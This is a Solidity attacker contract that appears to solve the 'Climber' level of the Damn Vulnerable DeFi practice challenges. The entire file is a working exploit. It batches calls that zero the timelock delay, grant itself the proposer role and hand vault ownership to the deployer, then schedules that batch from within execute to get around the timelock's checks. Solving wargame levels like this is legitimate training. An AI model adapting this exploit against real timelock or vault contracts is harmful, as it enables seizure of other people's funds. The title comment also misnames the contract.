// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "./ClimberConstants.sol";

interface IClimberTimelock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function updateDelay(uint64 newDelay) external;

    function grantRole(bytes32 role, address account) external;
}

interface IClimberVault {
    function withdraw(
        address token,
        address recipient,
        uint256 amount
    ) external;

    function transferOwnership(address newOwner) external;
}

/**
 * @title ClimberTimelock
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberAttacker {
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    IClimberTimelock immutable timelock;
    IClimberVault immutable vault;
    address attacker;

    constructor(address _timelock, address _vault) {
        timelock = IClimberTimelock(_timelock);
        attacker = msg.sender;
        vault = IClimberVault(_vault);

        targets.push(_timelock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        targets.push(_timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSelector(
                IClimberTimelock(_timelock).grantRole.selector,
                PROPOSER_ROLE,
                address(this)
            )
        );

        targets.push(_vault);
        values.push(0);
        dataElements.push(
            abi.encodeWithSelector(
                IClimberVault(_vault).transferOwnership.selector,
                msg.sender
            )
        );

        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("delegateSchedule()"));
    }

    function delegateSchedule() external {
        timelock.schedule(targets, values, dataElements, bytes32("abc"));
    }

    function attack() external {
        timelock.execute(targets, values, dataElements, bytes32("abc"));
    }
}
